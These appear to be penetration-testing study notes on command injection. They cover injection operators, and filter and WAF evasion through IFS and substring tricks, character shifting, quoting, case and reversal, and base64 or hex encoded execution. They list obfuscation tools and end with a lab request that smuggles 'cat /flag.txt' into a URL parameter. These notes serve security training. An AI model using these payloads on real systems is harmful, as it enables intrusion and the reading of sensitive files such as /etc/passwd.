### Content
- [Command Injection Methods](#command-injection-methods)
- [Evasion](#evasion)
	- [Substring Technique](#substring-technique)
		- [Linux](#linux)
		- [Windows](#windows)
	- [Character Shifting](#character-shifting)
	- [Obfuscation Techniques](#obfuscation-techniques)
	- Tools

> [!Note]
> For mor evasion techniques [PayloadsAllTheThings/Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---
#### Command Injection Methods
| **Injection Character** | **URL-Encoded Character** | **Executed Command**                       | Restrictions            |
| ----------------------- | ------------------------- | ------------------------------------------ | ----------------------- |
| ;                       | %3b                       | Execute command1 and then command2         | Not working in CMD      |
| \n                      | %0a                       | Both                                       |                         |
| &                       | %26                       | Execute command1 in the background         |                         |
| \|                      | %7c                       | Pipe the output of command1 into command2  |                         |
| &&                      | %26%26                    | Execute command2 only if command1 succeeds |                         |
| \|\|                    | %7c%7c                    | Execute command2 only if command1 fails    |                         |
| ``                      | %60%60                    | Both                                       | Sub-Shell for Unix-Only |
| $()                     | %24%28%29                 | Both                                       | Sub-Shell for Unix-Only |
> [!Warning]
> The `\n` on burp suite  gets URL-Encoded as separate characters to `%5C%6E`

---
# Evasion
- **Blacklist** with PHP code example:
	``` PHP
	$blacklist = ['&', '|', ';', ...SNIP...];
	foreach ($blacklist as $character) {
	    if (strpos($_POST['ip'], $character) !== false) {
	        echo "Invalid input";
	    }
	}
	$commands_blacklist = ['whoami', 'cat', ...SNIP...];
	foreach ($commands_blacklist as $word) {
	    if (strpos('$_POST['ip']', $word) !== false) {
	        echo "Invalid input";
	    }
	}
	```
- If the error message displayed in field where the output is displayed, That mean it has been detected by the backend language like `PHP`.
- If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.
- If the space character is blacklisted even if it's encoded `+`, Try:
	- `%09` tabs (Works on Linux and Windows). `127.0.0.1%0a%09`
	- `${IFS}` Linux Environment Variable may also work since its default value is a space and a tab. `127.0.0.1%0a${IFS}`
	- `Bash Brace Expansion`, which automatically adds spaces between arguments wrapped between braces. `127.0.0.1%0a{ls,-la}`
### Substring Technique
We can use a substring from an environment variable if typing that substring directly is blacklisted:
##### Linux
- Print all env vars with the command `printenv`, Example: `127.0.0.1%0a${IFS}printenv`
	- Specifying `start` index and `length` for substring.
	- `${PATH:0:1}` will be `/`, Ex: `127.0.0.1%0als${PATH:0:1}` to list the root directory.
	- `${LS_COLORS:10:1}` will be `;`, Ex: `127.0.0.1${LS_COLORS:10:1}${IFS}` will result in `127.0.0.1; `
##### Windows
- `CMD`: Use `SET` command to list all env vars.
	- we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\comp-user`)
	- Specify a starting position (`~6` -> `\comp`)
	- Specify a negative end position, which in this case is the length of the username `comp-user` (`-9` -> `\`)
	- `echo %HOMEPATH:~6,-9%` will result in `\`
- `PowerShell`: Use `Get-ChildItem env:` to list all env vars.
	- A word in `Powershell` is considered an array, so we can specify the index of the character we need.
		- `$env:HOMEPATH[0]` will result in `\`
### Character Shifting
Science every character has its own ascii code, Write a specific character with intention to change its ascii value to become another character when processed.
- Linux (Shifting characters by 1) 
	``` bash
	$ man ascii     # To display the ascii table
	$ echo $(tr '!-}' '"-~'<<<[) # [ (ascii:133) will become \ (ascii:134) 
	$ echo $(tr '!-}' '"-~'<<<:) # : (ascii:72) will become ; (ascii:73)
	$ echo $(tr '!-}' '"-~'<<<.) # . will become /
	```
- Windows (Shifting character by 1)
	- PowerShell
		``` Powershell
		PS C:\Users\user> [char](([int][char]'[') + 1) # [ (ascii:133) will become \ (ascii:134) 
		PS C:\Users\user> [char](([int][char]':') + 1) # : (ascii:72) will become ; (ascii:73)
		```
### Obfuscation Techniques
- Ignored characters by command shells:
	- Linux & Windows (Bash and PowerShell)
		-  Characters like `'`, `"`, Example: `whoami` = `w'h'o'am'i` = `w"h"o"am"i`
	- Linux
		- Characters like `\`, `$@`, Example: `whoami` = `who$@ami` = `w\ho\am\i`
	- Windows
		- Characters like `^`, Example: `whoami` = `who^ami`
- Case Manipulation:
	- Linux (Don't forget to replace spaces if they are blocked)
		- Commands for Bash are case-sensitive, workarounds: 
			- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
			- `$(a="WhOaMi";printf %s "${a,,}")`
	- Windows (PowerShell and CMD)
		- Commands for PowerShell and CMD are case-insensitive, Example: `WhOaMi`= `WHOAMI`
- Reversed Commands:
	- Linux
		- To reverse a command `echo 'whoami' | rev`
		- To reverse the reversed `$(rev<<<'imaohw')`
	- Windows
		- To reverse a string`"whoami"[-1..-20] -join ''`
		- Execute a reversed command directly with PowerShell sub-shell `iex "$('imaohw'[-1..-20] -join '')"`
- Encoded Commands:
	- Linux
		- b64 encoding then decode and execute using `base64` and `openssl`
			- ``echo -n 'whoami' | base64``
				- `bash<<<$(base64 -d<<<d2hvYW1p)`
				- `bash<<<$(openssl base64 -d<<<d2hvYW1p)`
			- convert the string from `utf-8` to `utf-16` before we `base64` it: `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`
		- Hex encoding with `xxd`
			- `echo -n 'whoami' | xxd -p`
				- `bash<<<$(xxd -r -p<<<'77686f616d69')`
		- Combine b64 encoding with Hex encoding
			1. Encode the original command in Base64: `echo -n 'whoami' | base64`
			2. Encode the Base64 output in Hex: `echo -n 'd2hvYW1p' | xxd -p`
			3. Decode and Execute: `bash<<<$(base64 -d<<<$(xxd -r -p<<<'6432687659573170'))`
	- Windows
		- b64 encoding
			- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
				- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
### Tools
- Linux ([Bashfuscator](https://github.com/Bashfuscator/Bashfuscator))
	``` bash
	$ git clone https://github.com/Bashfuscator/Bashfuscator
	$ cd Bashfuscator
	$ pip3 install setuptools==65
	$ python3 setup.py install --user
	$ ./bashfuscator -c 'cat /etc/passwd'
	$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
	
	[+] Mutators used: Token/ForCode
	[+] Payload:
	eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
	[+] Payload size: 104 characters
	# Test the outputted command with bash -c ''
	$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
	```
- Windows ([DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation))
	``` bash
	PS > git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
	PS > cd Invoke-DOSfuscation
	PS > Import-Module .\Invoke-DOSfuscation.psd1
	PS > Invoke-DOSfuscation
	Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
	Invoke-DOSfuscation> encoding
	Invoke-DOSfuscation\Encoding> 1
	
	...SNIP...
	Result:
	typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\...SNIP...
	```
---
`GET /files/index.php?to=&from=flag.txt${IFS}%24%28c'a't${IFS}${PATH:0:1}flag.txt%29&finish=1&move=1 HTTP/1.1`
